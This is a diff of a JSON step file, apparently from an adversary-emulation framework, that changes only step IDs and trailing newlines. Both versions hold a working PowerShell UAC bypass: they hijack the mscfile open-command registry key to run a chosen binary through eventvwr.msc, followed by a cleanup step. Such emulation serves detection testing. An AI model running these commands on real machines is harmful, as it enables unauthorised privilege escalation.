@@ -7,19 +7,19 @@
   ],
   "steps": [
     {
-      "id": "9734eecd-22ab-4688-84d7-de042d1dcaab",
+      "id": "6e306c27-3816-4de0-b8c5-36080bbbc98a",
       "type": "execute-command",
       "data": {
-        "command": "New-Item \"HKCU:\\software\\classes\\mscfile\\shell\\open\\command\" -Force\nSet-ItemProperty \"HKCU:\\software\\classes\\mscfile\\shell\\open\\command\" -Name \"(default)\" -Value \"#{executable_binary}\" -Force\nStart-Process \"C:\\Windows\\System32\\eventvwr.msc\"\n",
+        "command": "New-Item \"HKCU:\\software\\classes\\mscfile\\shell\\open\\command\" -Force\nSet-ItemProperty \"HKCU:\\software\\classes\\mscfile\\shell\\open\\command\" -Name \"(default)\" -Value \"#{executable_binary}\" -Force\nStart-Process \"C:\\Windows\\System32\\eventvwr.msc\"",
         "command_type": "powershell"
       },
       "elevation_required": false
     },
     {
-      "id": "9146fc4e-0c1b-4fbc-9555-48dcc79904f7",
+      "id": "8170bf19-faed-4803-8b36-f8fed97c8811",
       "type": "execute-command",
       "data": {
-        "command": "Remove-Item \"HKCU:\\software\\classes\\mscfile\" -force -Recurse -ErrorAction Ignore\n",
+        "command": "Remove-Item \"HKCU:\\software\\classes\\mscfile\" -force -Recurse -ErrorAction Ignore",
         "command_type": "powershell"
       },
       "elevation_required": false
@@ -27,14 +27,14 @@
   ],
   "flows": [
     {
-      "s": "9734eecd-22ab-4688-84d7-de042d1dcaab",
+      "s": "6e306c27-3816-4de0-b8c5-36080bbbc98a",
       "p": "on-success",
-      "o": "9146fc4e-0c1b-4fbc-9555-48dcc79904f7"
+      "o": "8170bf19-faed-4803-8b36-f8fed97c8811"
     },
     {
-      "s": "9734eecd-22ab-4688-84d7-de042d1dcaab",
+      "s": "6e306c27-3816-4de0-b8c5-36080bbbc98a",
       "p": "on-failure",
-      "o": "9146fc4e-0c1b-4fbc-9555-48dcc79904f7"
+      "o": "8170bf19-faed-4803-8b36-f8fed97c8811"
     }
   ],
   "tags": [
